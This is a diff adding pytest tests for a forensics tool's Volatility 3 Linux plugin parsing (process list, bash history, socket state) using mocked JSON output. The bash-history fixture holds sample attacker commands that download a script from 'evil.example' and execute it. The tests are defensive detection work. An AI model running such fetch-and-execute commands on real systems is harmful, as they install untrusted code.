@@ -16,6 +16,9 @@ from pathlib import Path
 import pytest
 
 from sift_find_evil.memory.volatility_runner import (
+    BashHistoryRow,
+    LinuxNetworkRow,
+    LinuxProcessRow,
     MissingVolatilityError,
     PluginExecutionError,
     VolatilityRunner,
@@ -333,3 +336,151 @@ def test_run_netscan_parses_connection_rows(
     assert rows[0].protocol == "TCPv4"
     assert rows[0].foreign_addr == "1.2.3.4"
     assert rows[0].foreign_port == 443
+
+
+# -- Linux plugin coverage (SFE-35e) ---------------------------------------
+#
+# Vol3 Linux plugins use different column names than the Windows side. The
+# runner normalizes them to snake_case via Linux-specific dataclasses so
+# downstream detectors never have to know which OS the dump came from.
+
+
+def test_run_linux_pslist_invokes_correct_argv(
+    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
+) -> None:
+    image = _fake_memory_image(tmp_path)
+    _patch_which(monkeypatch)
+
+    captured: dict = {}
+
+    def fake_run(argv, **kwargs):
+        captured["argv"] = argv
+        return _FakeCompleted(stdout="[]\n")
+
+    monkeypatch.setattr(subprocess, "run", fake_run)
+
+    rows = VolatilityRunner(image).run_linux_pslist()
+    assert rows == []
+    assert captured["argv"][-1] == "linux.pslist.PsList"
+
+
+def test_run_linux_pslist_parses_rows(
+    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
+) -> None:
+    image = _fake_memory_image(tmp_path)
+    _patch_which(monkeypatch)
+    payload = json.dumps(
+        [
+            {
+                "OFFSET (V)": "0xffff8801a1234567",
+                "PID": 1,
+                "TID": 1,
+                "PPID": 0,
+                "COMM": "systemd",
+                "EUID": 0,
+                "CreationTime": "2020-09-20T10:00:00",
+                "File output": "Disabled",
+                "__children": [],
+            },
+            {
+                "OFFSET (V)": "0xffff8801a9abcdef",
+                "PID": 4242,
+                "TID": 4242,
+                "PPID": 1,
+                "COMM": "evil",
+                "EUID": 1000,
+                "CreationTime": "2020-09-20T10:15:30",
+                "File output": "Disabled",
+                "__children": [],
+            },
+        ]
+    )
+    monkeypatch.setattr(
+        subprocess, "run", lambda *a, **kw: _FakeCompleted(stdout=payload)
+    )
+
+    rows = VolatilityRunner(image).run_linux_pslist()
+    assert len(rows) == 2
+    assert isinstance(rows[0], LinuxProcessRow)
+    assert rows[0].pid == 1
+    assert rows[0].name == "systemd"
+    assert rows[0].euid == 0
+    assert rows[1].pid == 4242
+    assert rows[1].name == "evil"
+    assert rows[1].euid == 1000
+    assert rows[1].raw_row["CreationTime"] == "2020-09-20T10:15:30"
+
+
+def test_run_linux_bash_parses_command_history(
+    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
+) -> None:
+    image = _fake_memory_image(tmp_path)
+    _patch_which(monkeypatch)
+    payload = json.dumps(
+        [
+            {
+                "PID": 4242,
+                "Process": "bash",
+                "CommandTime": "2020-09-20 10:30:00 UTC+0000",
+                "Command": "wget http://evil.example/payload.sh",
+                "__children": [],
+            },
+            {
+                "PID": 4242,
+                "Process": "bash",
+                "CommandTime": "2020-09-20 10:30:05 UTC+0000",
+                "Command": "chmod +x payload.sh && ./payload.sh",
+                "__children": [],
+            },
+        ]
+    )
+    monkeypatch.setattr(
+        subprocess, "run", lambda *a, **kw: _FakeCompleted(stdout=payload)
+    )
+
+    rows = VolatilityRunner(image).run_linux_bash()
+    assert len(rows) == 2
+    assert isinstance(rows[0], BashHistoryRow)
+    assert rows[0].pid == 4242
+    assert rows[0].process == "bash"
+    assert "wget" in (rows[0].command or "")
+    assert rows[1].command and "chmod" in rows[1].command
+
+
+def test_run_linux_sockstat_parses_connection_rows(
+    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
+) -> None:
+    image = _fake_memory_image(tmp_path)
+    _patch_which(monkeypatch)
+    payload = json.dumps(
+        [
+            {
+                "Netns": 4026531992,
+                "Family": "AF_INET",
+                "Proto": "TCP",
+                "Source Addr": "10.0.0.5",
+                "Source Port": 55302,
+                "Destination Addr": "198.51.100.7",
+                "Destination Port": 443,
+                "State": "ESTABLISHED",
+                "Process": "evil",
+                "PID": 4242,
+                "__children": [],
+            },
+        ]
+    )
+    monkeypatch.setattr(
+        subprocess, "run", lambda *a, **kw: _FakeCompleted(stdout=payload)
+    )
+
+    rows = VolatilityRunner(image).run_linux_sockstat()
+    assert len(rows) == 1
+    assert isinstance(rows[0], LinuxNetworkRow)
+    assert rows[0].protocol == "TCP"
+    assert rows[0].local_addr == "10.0.0.5"
+    assert rows[0].local_port == 55302
+    assert rows[0].foreign_addr == "198.51.100.7"
+    assert rows[0].foreign_port == 443
+    assert rows[0].state == "ESTABLISHED"
+    assert rows[0].process == "evil"
+    assert rows[0].pid == 4242
